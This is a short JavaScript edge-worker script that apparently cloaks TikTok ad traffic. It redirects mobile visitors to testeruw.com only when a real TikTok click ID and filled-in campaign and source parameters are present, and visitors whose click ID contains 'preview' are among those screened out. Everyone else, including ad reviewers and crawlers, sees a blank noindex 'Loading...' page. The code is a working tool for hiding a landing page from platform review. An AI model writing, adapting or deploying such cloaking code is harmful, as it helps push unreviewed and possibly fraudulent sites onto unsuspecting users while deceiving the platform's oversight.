export default {
  async fetch(request) {
    const url = new URL(request.url);
    const userAgent = request.headers.get('User-Agent') || '';
    
    // Check if mobile device
    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
    
    if (isMobile) {
      // Get parameters
      const params = url.searchParams;
      const ttclid = params.get('ttclid');
      const utm_campaign = params.get('utm_campaign');
      const utm_source = params.get('utm_source');
      
      // Validate all conditions
      if (ttclid && 
          !ttclid.toLowerCase().includes('preview') && 
          utm_campaign && 
          utm_campaign !== '__CAMPAIGN_NAME__' && 
          utm_source && 
          utm_source !== '__PLACEMENT__') {
        
        // Build redirect URL with all parameters
        const redirectUrl = new URL('https://testeruw.com/');
        for (const [key, value] of params.entries()) {
          redirectUrl.searchParams.append(key, value);
        }
        
        // Perform server-side redirect
        return Response.redirect(redirectUrl.toString(), 302);
      }
    }
    
    // Return blank HTML page for everyone else
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="robots" content="noindex, nofollow">
  <title>Loading...</title>
</head>
<body>
  <div style="text-align:center;padding:50px;font-family:Arial;">
    <h1>Loading...</h1>
    <p>Please wait...</p>
  </div>
</body>
</html>`;
    
    return new Response(html, {
      headers: {
        'Content-Type': 'text/html;charset=UTF-8',
      },
    });
  },
};